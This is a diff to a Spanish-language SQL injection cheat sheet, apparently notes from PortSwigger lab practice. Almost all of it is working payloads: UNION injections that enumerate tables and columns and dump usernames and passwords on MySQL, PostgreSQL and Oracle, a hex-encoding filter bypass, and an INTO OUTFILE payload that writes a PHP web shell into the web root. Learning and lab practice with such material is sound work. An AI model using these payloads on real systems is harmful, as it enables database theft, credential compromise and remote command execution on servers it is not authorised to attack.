@@ -2,8 +2,8 @@
 Variable a cambiar --> $WORD
 
 # Vulnerabilty in where cluase allowing retrieval of hidden data
-
 La típica de toda la vida
+**Muestra más información de la que debe**, nos podemos fijar si en la barra de desplazamiento de la derecha aumenta
 
 ````sql
 $WORD' or 1=1-- -
@@ -123,7 +123,7 @@ $WORD' union select table_name,null from information_schema.tables-- -
 
 Para que no pase esto podemos utilizar where:
 ````sql
-$WORD' union select table_name,null from information_schema.tables where table_schema='public'-- -
+$WORD' union select table_name,null from information_schema.tables where table_schema='NOMBREBD'-- -
 ````
 
 ## Listar Columnas
@@ -135,12 +135,12 @@ $WORD' union select column_name,null from information_schema.columns where table
 ## Ver campos y datos
 Si lo permite podemos utilizar los dos campos para que un lado aparezca el nombre y en otro aparezca la contraseña:
 ````sql
-$WORD' union select username, password from users-- -
+$WORD' union select username, password from NOMBRETABLA-- -
 ````
 
 Si no te lo permite y solo puedes con un campo puedes utilizar la función concat:
 ````sql
-$WORD' union select null, concat(username,':',password) from users-- -
+$WORD' union select null, concat(username,':',password) from NOMBRETABLA-- -
 ````
 
 En caso de que sea otra base de datos la que contiene estos campos tendríamos que indicarlo
@@ -151,7 +151,7 @@ $WORD' union select null, concat(username,':',password) from OtraTabla.users-- -
 ### Otra forma de concatenar la información (Bypassing con pipes || )
 Si no permite la anterior podemos probar así:
 ````sql
-$WORD' union select null, username||':'||password from users-- -
+$WORD' union select null, username||':'||password from NOMBRETABLA-- -
 ````
 
 ### Bypassing cadenas de caracteres con hexadecimal
@@ -176,7 +176,90 @@ $WORD' union select <?php system('whoami'); ?>,"test" into outfile "/var/www/htm
 ````
 La ruta no tiene porque ser está, esto tendríamos que investigar cual sería
 
-Vídeo de s4vi --> 1:13:20
+## Oracle
+
+## Ver las filas que se están usando Oracle
+
+Es igual que sql, con la diferencia de que aquí **siempre tienes que estár apuntando a una tabla**
+
+Para ello vamos a utilizar la tabla **dual**, que está la tienen todas las bases de datos de Oracle por defecto (es la tabla boba)
+````sql
+$WORD' union select null,null from dual-- -
+````
+
+## Identificar campo vulnerable y ver versión y tipo de Oracle
+
+Sabemos que el segundo campo es el que nos va a permitir representar información así que pedimos la versión y el tipo con **banner from v$version**
+
+````sql
+$WORD' union select null,banner from v$version-- -
+````
+
+Hay otra forma de hacerlo por sí la primera no funciona:
+````sql
+$WORD' union select null,version from v$instance-- -
+````
+
+## Comprobación de usuario/Ver tablas existentes Oracle
+Ver tablas existentes del usuario (que es una base de datos)
+````sql
+$WORD' union select null,table_name from user_tables-- -
+````
+
+o
+
+ver todos los usuarios/propietarios  de todas las  tablas:
+
+````sql
+$WORD' union select null,owner from all_tables-- -
+````
+
+Ver todos las tablas incluso las creadas por defecto(esto **no nos suele interesar**)
+````sql
+$WORD' union select null,table_name from all_tables-- -
+````
+
+
+## Ver el contenido de la tabla la tabla Oracle
+
+Una vez tengamos el usuario que es propietario de la tabla a la que queremos acceder, podemos preguntarle las filas
+````sql
+$WORD' union select null,table_name from all_tables where owner='NOMBREUSUARIO'-- -
+````
+
+## Ver filas/columnas Oracle
+
+````sql
+$WORD' union select null,column_name from all_tab_columns where table_name='NOMBRETABLA'-- -
+````
+
+## Ver datos y información Oracle
+
+#### Con concat
+````sql
+$WORD' union select null,concat(FILA,concat(':',OTRAFILA)) from TABLA-- -
+````
+
+#### Con tuberías
+
+````sql
+$WORD' union select null,FILA || ':' || OTRAFILA from TABLA-- -
+````
+
+### Mostrar versión y tipo en MySQL y Microsoft
+
+Lo mismo que en oracle, pero se utiliza otro comando
+````sql
+$WORD' union select null,@@version-- -
+````
+
+
+
+[Vídeo de s4vi](https://www.youtube.com/watch?v=C-FiImhUviM&t=4400s) --> 1:33:30
+
+
+# Herramientas de automatización
+Sqlmap
 
 # Fuentes
 Laboratorio Portwsigger
